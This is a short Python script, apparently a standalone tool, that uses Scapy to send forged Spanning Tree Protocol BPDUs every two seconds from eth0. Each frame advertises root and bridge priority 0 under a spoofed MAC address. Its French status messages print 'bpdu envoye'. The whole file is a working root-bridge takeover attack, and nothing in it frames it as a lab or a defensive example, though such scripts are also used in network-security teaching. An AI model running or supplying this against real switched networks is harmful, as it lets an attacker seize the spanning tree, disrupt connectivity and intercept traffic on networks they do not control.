from scapy.all import *
import time

try:
    while True:
        bpdu = (Ether(dst="01:80:c2:00:00:00", src="aa:aa:aa:aa:aa:aa") /
                LLC(dsap=0x42, ssap=0x42, ctrl=3) /
                STP(bpdutype=0, bpduflags=0,
                    rootid=0, rootmac="aa:aa:aa:aa:aa:aa",
                    pathcost=0,
                    bridgeid=0, bridgemac="aa:aa:aa:aa:aa:aa",
                    portid=0x8001, age=0, maxage=20, hellotime=2, fwddelay=15))
        sendp(bpdu, iface="eth0", verbose=False)
        print("bpdu envoye")
        time.sleep(2)

except KeyboardInterrupt:
    print("stop")